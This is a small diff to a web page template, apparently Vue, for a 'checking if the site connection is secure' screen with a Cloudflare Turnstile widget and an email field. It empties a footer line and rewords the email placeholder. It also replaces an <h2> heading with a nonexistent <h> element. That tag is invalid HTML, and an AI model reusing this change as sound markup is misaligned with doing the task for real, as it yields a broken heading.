@@ -9,7 +9,7 @@
     </header>
     <main>
       <div class="instructions">
-        <h2>Please stand by while we are checking if the site connection is secure.</h2>
+        <h>Please stand by while we are checking if the site connection is secure.</h>
         <div
           class="cf-turnstile"
           data-sitekey="0x4AAAAAABgei6QZruCN7n08"
@@ -17,7 +17,7 @@
       </div>
     </main>
     <footer>
-      <p>Did you know there are Verified Bots that are allowed around the internet because they help provide services we use day to day?</p>
+      <p></p>
     </footer>
   </div>
 
@@ -36,7 +36,7 @@
             <input
               v-model="email"
               type="email"
-              placeholder="Enter email"
+              placeholder="Email required"
               required
               class="email-input"
               :disabled="loading"
